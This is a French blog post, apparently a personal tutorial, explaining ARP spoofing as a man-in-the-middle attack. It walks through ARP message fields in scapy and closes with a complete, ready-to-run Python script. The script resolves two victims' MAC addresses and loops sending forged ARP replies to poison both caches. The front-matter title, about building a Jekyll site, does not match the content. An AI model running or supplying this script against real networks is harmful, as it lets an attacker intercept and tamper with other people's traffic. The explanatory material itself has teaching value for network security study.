---
layout: post
lang: fr
title: Construisez un site statique avec Github et Jekyll
---

L'ARP spoofing ( connue également sous le nom de ARP poisoning ) est une technique d'attaque MITM ( Man In The Middle ). 
Elle permet de compromettre la communication entre deux machines sur un même réseau.

Le protocole ARP ( Address Resolution Protocol ) permet de traduire des adresses IP en adresses MAC. 

En effet, sur un même réseau, les machines communiquent entre elles en envoyant des messages destinés à une adresse MAC : 
lorsqu'une machine reçoit un message réseau, elle regarde si l'adresse MAC de destination du message correspond à son adresse MAC, si tel 
est le cas, alors la carte réseau va accepter ce message et poursuivre son traitement ( vérifier que l'adresse IP de destination 
correspond bien à notre adresse IP par exemple ).

Le protocole ARP est très simple, il contient deux types de messages :
 - Qui est `w.x.y.z` et quelle est ton adresse MAC ?
 - Je suis `w.x.y.z` et mon adresse MAC est `aa:bb:cc:dd:ee:ff`
 
 Puisqu'une image vaut mille mots ... 
 ![Schéma de fonctionnement de l'attaque ARP spoofing](https://github.com/theobarrague/theobarrague.github.io/blob/main/images/arp-spoof.png?raw=true)

Regardons les champs d'un message ARP :

```python
>>> from scapy.all import *
>>> ls(ARP)
hwtype     : XShortField                         = (1)
ptype      : XShortEnumField                     = (2048)
hwlen      : FieldLenField                       = (None)
plen       : FieldLenField                       = (None)
op         : ShortEnumField                      = (1)
hwsrc      : MultipleTypeField                   = (None)
psrc       : MultipleTypeField                   = (None)
hwdst      : MultipleTypeField                   = (None)
pdst       : MultipleTypeField                   = (None)
```

Pour ne pas s'embêter, on regarde sur [Wikipédia](https://en.wikipedia.org/wiki/Address_Resolution_Protocol) et on trouve que :
- `hwtype` : protocole utilisé sur le support d'accès au réseau ( où Ethernet = 1 )
- `hlen` : taille de l'adresse ( en octets ) du protocole utilisé psur le support d'accès au réseau ( dans le cas de Ethernet, 6 ) 
- `ptype` : protocole réseau ( où IPv4 = `0x0800` )
- `plen`: taille de l'adresse ( en octets ) du protocole réseau ( dans le ca de IPv4, 4 )
- `op` : code d'opération où 1 est une demande et 2 une réponse
- `hwsrc` : adresse du support réseau de la machine source ( adresse MAC ou adresse matérielle )
- `psrc` : adresse réseau de la machine source
- `hwdst` : adresse du support réseau de la machine cible
- `pdst` : adresse réseau de la machine cible

Ainsi, si Alice ( `1.1.1.1` ) veut connaître l'adresse matérielle de Bob ( `2.2.2.2` ) elle enverrait ce message : 

```python
msg = ARP(hwtype=1, # Réseau Ethernet
          ptype=2048, # Réseau IPv4
          hwlen=6, # Taille d'une adresse MAC
          plen=4, # Taille d'une adresse IPv4
          op=1, # Demande d'adresse MAC
          hwsrc='aa:aa:aa:aa:aa:aa', # Adresse matérielle de Alice
          psrc='1.1.1.1', # Adresse réseau de Alice
          hwdst='00:00:00:00:00:00', # Adresse matérielle de Bob ( on ne la connaît pas encore )
          pdst='2.2.2.2' # Adresse réseau de Bob
      ) 
```

Que l'on pourrait traduire par `Bonjour Bob ( 2.2.2.2 ) 👋 Je suis Alice ( 1.1.1.1 ), mon adresse matérielle est aa:aa:aa:aa:aa:aa. Et toi, quelle est ton adresse matérielle ?`

Bob ( `2.2.2.2` ) répondrait donc avec un message comme celui-là :

```python
msg = ARP(hwtype=1,
          ptype=2048,
          hwlen=6,
          plen=4,
          op=2, # Réponse à une demande d'adresse MAC
          hwsrc='bb:bb:bb:bb:bb:bb', # Adresse matérielle de Bob
          psrc='2.2.2.2', # Adresse réseau de Bob
          hwdst='aa:aa:aa:aa:aa:aa', # Adresse matérielle d'Alice
          pdst='1.1.1.1' # Adresse réseau d'Alice
      )
```

Que l'on pourrait traduire par `Bonjour Alice ( 1.1.1.1 ) 👋 Mon adresse matérielle est bb:bb:bb:bb:bb:bb`

Ainsi pour faire de l'ARP spoofing, il suffit d'innonder le réseau de fausses requêtes. Voici mon implémentation :
```python
#!/usr/bin/env python

from time import sleep
import signal
import sys

# Handle CTRL+C / SIGINT to properly stop the attack
# Rearping targets to restore network
def signal_handler(sig, frame):
  global alice_ip
  global bob_ip
  global alice_hw
  global bob_hw    
  print('Network restoration on Alice')
  send(ARP(pdst=alice_ip, hwdst=alice_hw, psrc=bob_ip, hwsrc=bob_hw, op=2), count=5, inter=.2)
  print('Network restoration on Bob')
  send(ARP(pdst=bob_ip, hwdst=bob_hw, psrc=alice_ip, hwsrc=alice_hw, op=2), count=5, inter=.2)
  sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

from scapy.all import *
conf.verb = 0

iface = sys.argv[1]
alice_ip = sys.argv[2]
bob_ip = sys.argv[3]

# Grabbing our IP and MAC
me_ip = get_if_addr(iface)
me_hw = get_if_hwaddr(iface)
print('Me ( {0} ) is at {1}'.format(me_ip, me_hw))

# Grabbing Alice MAC
x = sr1(ARP(pdst=alice_ip), iface=iface, timeout=2)
alice_hw = x.hwsrc
print('Alice ( {0} ) is at {1}'.format(alice_ip, alice_hw))

# Grabbing Bob MAC
x = sr1(ARP(pdst=bob_ip), iface=iface, timeout=2)
bob_hw = x.hwsrc
print('Bob ( {0} ) is at {1}'.format(bob_ip, bob_hw))

# Spoofing network
print('Spoofing in progress ... Send SIGINT to properly stop the attack.')
while True:
  # Tell to Alice that we are Bob
  x = ARP(pdst=alice_ip, hwdst=alice_hw, hwsrc=me_hw, psrc=bob_ip, op=2)
  send(x)

  # Tell to Bob that we are Alice
  x = ARP(pdst=bob_ip, hwdst=bob_hw, hwsrc=me_hw, psrc=alice_ip, op=2)
  send(x)

  # Do not unnecessarily overload the network
  sleep(5)
```
